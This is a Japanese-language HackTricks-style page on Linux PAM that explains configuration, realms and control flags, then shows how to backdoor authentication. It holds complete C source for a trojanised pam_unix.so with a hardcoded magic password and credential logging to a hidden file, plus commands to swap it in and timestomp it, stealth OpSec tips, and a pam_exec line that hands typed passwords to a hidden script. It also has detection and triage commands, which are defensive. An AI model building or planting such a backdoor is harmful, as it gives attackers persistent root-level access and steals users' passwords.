# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本情報

**PAM (Pluggable Authentication Modules)** は、**コンピューターサービスへのアクセスを試みるユーザーの身元を確認する**セキュリティメカニズムとして機能し、さまざまな基準に基づいてアクセスを制御します。これはデジタルの門番のようなもので、認証されたユーザーだけが特定のサービスを利用できるようにし、さらにシステムの過負荷を防ぐために利用を制限する場合もあります。

#### 設定ファイル

- **Solaris および UNIX ベースのシステム**では、通常 `/etc/pam.conf` にある中央設定ファイルを使用します。
- **Linux システム**ではディレクトリ方式が採用され、サービス固有の設定が `/etc/pam.d` 内に保存されます。たとえば、login service の設定ファイルは `/etc/pam.d/login` にあります。

login service の PAM 設定例は次のようになります。
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

これらのrealm、つまりmanagement groupには **auth**、**account**、**password**、**session** があり、それぞれ認証およびsession管理プロセスの異なる側面を担当します。

- **Auth**: 多くの場合パスワードの入力を求めることで、ユーザーのidentityを検証します。
- **Account**: group membershipや時間帯による制限などの条件を確認し、accountを検証します。
- **Password**: complexity checksやdictionary attacksの防止など、パスワードの更新を管理します。
- **Session**: directoryのmountやresource limitsの設定など、service sessionの開始時または終了時の処理を管理します。

#### **PAM Module Controls**

Controlsは、成功または失敗に対するmoduleのresponseを決定し、authentication process全体に影響を与えます。これには次のものがあります。

- **Required**: required moduleが失敗すると、後続のすべてのmoduleを確認した後に最終的に失敗します。
- **Requisite**: 失敗するとprocessを直ちに終了します。
- **Sufficient**: 成功すると、後続のmoduleが失敗しない限り、同じrealmにおける残りのcheckをスキップします。
- **Optional**: stack内で唯一のmoduleである場合にのみ失敗の原因になります。

#### Offensive Semantics That Matter

PAMをbackdooringする際は、payload自体よりも**挿入するruleの位置**が重要になることがよくあります。

- `include`と`substack`は他のfileからruleを取り込むため、`sshd`を編集してもSSHにしか影響しない一方、`system-auth`、`common-auth`、または別のshared stackを編集すると複数のserviceに一度に影響します。
- PAMは`[success=1 default=ignore]`のようなbracketed controlsもサポートします。これらを悪用すると、`pam_unix.so`を目に見える形で置き換えるのではなく、custom checkが成功した後の1つ以上のmoduleを**skip**できます。
- `module-path`には**absolute** path（`/usr/lib/security/pam_custom.so`）またはdefault PAM module directoryからの**relative** pathを指定できます。modern Linux systemsでは、実際のdirectoryは`/lib/security`、`/lib64/security`、`/usr/lib/security`、または`/usr/lib/x86_64-linux-gnu/security`のようなmultiarch pathであることがよくあります。

Quick operator takeaway: patchする前に、必ず**full service graph**を把握してください。たとえば、一部のdistroでは`sshd -> password-auth -> system-auth`、別のdistroでは`sshd -> system-remote-login -> system-login -> system-auth`となるため、同じ1行のimplantが意図した範囲を大幅に超えてfan outする可能性があります。

#### Example Scenario

複数のauth moduleを使用するsetupでは、processは厳密な順序に従います。`pam_securetty` moduleがlogin terminalをunauthorizedと判断すると、root loginはblockされますが、`required` statusであるため、すべてのmoduleの処理は継続されます。`pam_env`はenvironment variablesを設定し、user experienceの向上に役立つ可能性があります。`pam_ldap`と`pam_unix` moduleは連携してuserをauthenticateします。このとき`pam_unix`は以前に提供されたpasswordの使用を試みるため、authentication methodsのefficiencyとflexibilityが向上します。


## Backdooring PAM – Hooking `pam_unix.so`

high-valueなLinux environmentsにおけるclassicなpersistence trickは、**legitimateなPAM libraryをtrojanised drop-inに置き換えること**です。すべてのSSH / console loginは最終的に`pam_unix.so:pam_sm_authenticate()`を呼び出すため、数行のCだけでcredentialsをcaptureしたり、*magic* password bypassを実装したりできます。

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

コンパイルしてステルス置換する:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – 一時ファイルに書き込み、`mv` で所定の場所に移動して、SSH をロックアウトするような不完全なライブラリを回避する。
2. `/usr/bin/.dbus.log` のようなログファイルの配置は、正規のデスクトップ artefact に紛れ込む。
3. PAM の誤動作を避けるため、シンボルの export（`pam_sm_setcred` など）を同一に保つ。

### Detection
* `pam_unix.so` の MD5/SHA256 を distro package と比較する。
* `rpm -V pam` または `debsums -s libpam-modules` を使うと、手動で hash を計算せずに置き換えられたライブラリを発見できる。
* `/lib/security/` 配下で、world-writable または通常と異なる ownership を確認する。
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* PAM configs で予期しない modules を grep する: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### `pam_exec`を悪用したpersistence

`pam_unix.so`を置き換える代わりに、`/etc/pam.d/sshd`へ`pam_exec`の行を追加するという、より軽微な方法があります。これにより、通常のstackをそのまま維持しながら、SSH loginのたびにimplantを起動できます。
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` は、`PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY`、`PAM_TYPE` などの環境変数で PAM メタデータを受け取ります。`expose_authtok` を指定すると、helper は `auth` または `password` フェーズ中に `stdin` からパスワードも読み取れます。helper を real UID ではなく effective UID で実行する場合は、`seteuid` を追加します。

実用上の注意:

- `session optional pam_exec.so ...` は、ソケットの再オープンや detached daemon の spawn などの **post-login actions** に適しています。
- `auth optional pam_exec.so quiet expose_authtok ...` は、セッションが開く前に実行されるため、**credential capture** で通常使用されます。
- `type=session` または `type=auth` を使用すると、特定の PAM フェーズに実行を限定し、冗長な二重実行を回避できます。

### Distro tooling を存続させる: `authselect`

RHEL、CentOS Stream、Fedora、および派生システムでは、`/etc/pam.d/system-auth` や `/etc/pam.d/password-auth` などの生成ファイルを直接編集すると、**`authselect` によって上書きされる**可能性があります。永続化するには、通常、`/etc/authselect/custom/<profile>/` 配下の有効な custom profile に patch を適用し、その後に再選択または apply を行います。

root 権限がある場合の一般的な workflow:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
これは攻撃とtriageの両方に関係します。`/etc/pam.d/system-auth` に `Generated by authselect` と `Do not modify this file manually` というバナーが含まれている場合、実際の永続化ポイントは `/etc/pam.d/` ではなく、`/etc/authselect/custom/` 配下に存在する可能性があります。

### 実環境で確認されたRecent tradecraft

2025年に報告された **Plague** Linux backdoorでは、同じ基本概念がさらに発展していました。具体的には、**static bypass password**を備えた悪意のあるPAM componentに加え、SSH関連の環境変数とshell history（`HISTFILE=/dev/null`）を削除し、login後のsession tracesを減らしていました。これは有用なhunting patternです。backdoor logicはPAM内に存在する一方、stealth artifactsはauthenticationが成功した**後**にのみ現れる可能性があるためです。


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: Linux向けに新たに発見されたPAM-Based Backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
